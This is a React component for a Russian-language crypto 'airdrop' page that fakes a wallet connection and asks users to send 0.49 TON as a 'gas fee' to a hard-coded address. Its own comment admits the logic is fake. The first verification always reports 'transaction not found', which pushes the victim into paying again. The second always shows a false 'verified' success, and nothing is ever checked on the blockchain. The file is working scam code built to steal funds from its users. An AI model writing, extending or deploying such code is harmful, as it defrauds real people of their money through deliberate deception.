import React, { useState } from 'react';
import { WALLET_ADDRESS } from '../constants';
import { Wallet, Loader2, CheckCircle2, AlertCircle, Copy, ExternalLink } from 'lucide-react';

type Step = 'SELECT' | 'CONNECTING' | 'PAY' | 'VERIFYING' | 'ERROR' | 'SUCCESS';

const Airdrop: React.FC = () => {
  const [step, setStep] = useState<Step>('SELECT');
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [verifyCount, setVerifyCount] = useState(0);

  const wallets = [
    { id: 'tonkeeper', name: 'Tonkeeper', icon: 'https://tonkeeper.com/assets/tonkeeper_256.png' },
    { id: 'wallet', name: 'Telegram Wallet', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/2048px-Telegram_logo.svg.png' },
    { id: 'okx', name: 'OKX Wallet', icon: 'https://play-lh.googleusercontent.com/9n94N5l001D4H6zRj50_X4VnKqzK-R8mPz9O8-v8Q-rR-v_v-v_v-v_v-v_v' }, // Generic placeholder URLs if needed, using text for now or simple divs
  ];

  const handleConnect = (walletId: string) => {
    setSelectedWallet(walletId);
    setStep('CONNECTING');
    setTimeout(() => {
      setStep('PAY');
    }, 2000);
  };

  const handleVerify = () => {
    setStep('VERIFYING');
    
    // Fake logic: Fail first, succeed second
    const waitTime = verifyCount === 0 ? 4000 : 2000;
    
    setTimeout(() => {
      if (verifyCount === 0) {
        setStep('ERROR');
        setVerifyCount(1);
      } else {
        setStep('SUCCESS');
      }
    }, waitTime);
  };

  const copyAddress = () => {
    navigator.clipboard.writeText(WALLET_ADDRESS);
    // Could add toast here
  };

  return (
    <div className="flex flex-col h-full p-6 pt-10 pb-24 overflow-y-auto">
      
      {/* Title */}
      <div className="text-center mb-10">
        <h1 className="text-3xl font-bold text-white mb-2">Задания Airdrop</h1>
        <p className="text-gray-400 text-sm">Подключите кошелек для получения дропа</p>
      </div>

      {step === 'SELECT' && (
        <div className="space-y-3 animate-in fade-in slide-in-from-bottom-4 duration-500">
            {wallets.map(w => (
                <button
                    key={w.id}
                    onClick={() => handleConnect(w.id)}
                    className="w-full bg-[#1c1c1e] hover:bg-white/10 p-4 rounded-xl flex items-center justify-between group transition-all border border-white/5"
                >
                    <div className="flex items-center space-x-4">
                        <div className="w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center text-xs overflow-hidden">
                           {/* Fallback icon */}
                           <Wallet size={20} />
                        </div>
                        <span className="font-bold text-white">{w.name}</span>
                    </div>
                    <div className="w-4 h-4 rounded-full border-2 border-gray-600 group-hover:border-white transition-colors"></div>
                </button>
            ))}
        </div>
      )}

      {step === 'CONNECTING' && (
        <div className="flex flex-col items-center justify-center flex-1 animate-in fade-in zoom-in duration-300">
            <Loader2 size={48} className="text-blue-500 animate-spin mb-4" />
            <p className="text-white font-bold">Безопасное подключение...</p>
        </div>
      )}

      {(step === 'PAY' || step === 'VERIFYING' || step === 'ERROR') && (
        <div className="bg-[#1c1c1e] rounded-2xl p-6 border border-white/10 animate-in fade-in slide-in-from-bottom-8">
            <div className="flex justify-between items-start mb-6">
                <div>
                    <h3 className="text-xl font-bold text-white">Требуется оплата Gas</h3>
                    <p className="text-xs text-gray-400 mt-1">Комиссия за верификацию в блокчейне</p>
                </div>
                <div className="bg-blue-500/20 text-blue-400 px-2 py-1 rounded text-xs font-bold">
                    Сеть TON
                </div>
            </div>

            <div className="bg-black/50 p-4 rounded-xl mb-6">
                <div className="flex justify-between text-sm mb-2">
                    <span className="text-gray-400">Сумма</span>
                    <span className="text-white font-bold">0.49 TON</span>
                </div>
                <div className="flex justify-between text-sm mb-4">
                    <span className="text-gray-400">Адрес</span>
                </div>
                <div className="flex items-center space-x-2 bg-[#1c1c1e] p-2 rounded-lg border border-white/5">
                    <code className="text-[10px] text-gray-300 break-all flex-1 font-mono">
                        {WALLET_ADDRESS}
                    </code>
                    <button onClick={copyAddress} className="p-2 hover:text-white text-gray-500">
                        <Copy size={14} />
                    </button>
                </div>
            </div>

            <div className="space-y-3">
                <a 
                    href={`ton://transfer/${WALLET_ADDRESS}?amount=490000000`}
                    className="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl flex items-center justify-center space-x-2 transition-colors"
                >
                    <span>Оплатить 0.49 TON</span>
                    <ExternalLink size={16} />
                </a>

                {step === 'VERIFYING' ? (
                     <button disabled className="w-full bg-gray-700 text-gray-400 font-bold py-3 rounded-xl flex items-center justify-center space-x-2 cursor-not-allowed">
                        <Loader2 size={16} className="animate-spin" />
                        <span>Проверка транзакции...</span>
                    </button>
                ) : (
                    <button 
                        onClick={handleVerify}
                        className={`w-full font-bold py-3 rounded-xl transition-all ${step === 'ERROR' ? 'bg-red-500/20 text-red-500 border border-red-500/50' : 'bg-white/5 hover:bg-white/10 text-white'}`}
                    >
                        {step === 'ERROR' ? 'Транзакция не найдена (Повторить)' : 'Проверить транзакцию'}
                    </button>
                )}
            </div>
            
            {step === 'ERROR' && (
                <div className="mt-4 flex items-start space-x-2 text-red-400 text-xs">
                    <AlertCircle size={14} className="mt-0.5 shrink-0" />
                    <p>Мы не нашли транзакцию в последнем блоке. Пожалуйста, убедитесь, что отправили точную сумму, и попробуйте снова через 10 секунд.</p>
                </div>
            )}
        </div>
      )}

      {step === 'SUCCESS' && (
        <div className="flex flex-col items-center justify-center flex-1 animate-in zoom-in duration-500">
            <div className="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mb-6 relative">
                <div className="absolute inset-0 bg-green-500/20 rounded-full animate-ping"></div>
                <CheckCircle2 size={48} className="text-green-500" />
            </div>
            <h2 className="text-2xl font-bold text-white mb-2">Кошелек подключен</h2>
            <p className="text-gray-400 text-center mb-8">Ваш кошелек успешно верифицирован в блокчейне. Аллокация дропа закреплена.</p>
            
            <div className="bg-[#1c1c1e] px-6 py-3 rounded-full border border-green-500/30 text-green-400 font-mono text-sm">
                Статус: Верифицирован
            </div>
        </div>
      )}

    </div>
  );
};

export default Airdrop;